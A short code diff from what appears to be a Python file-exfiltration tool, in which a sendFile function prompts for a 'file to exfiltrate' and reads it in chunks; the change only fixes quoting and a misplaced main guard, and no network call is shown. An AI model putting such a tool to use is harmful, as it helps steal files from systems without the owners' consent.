@@ -73,9 +73,8 @@ def sendFile(server, port):
     fileName = raw_input('Enter path to file to exfiltrate: ')
     chunkSize = int(raw_input('Enter size of file chunk (use max chunk or less in server output): '))
     chunkCount = 1
-    with open(fileName,"rb") as in_file:
+    with open(fileName,'rb') as in_file:
 
-        if __name__ == '__main__':
             while True:
                 piece = in_file.read(chunkSize)
 
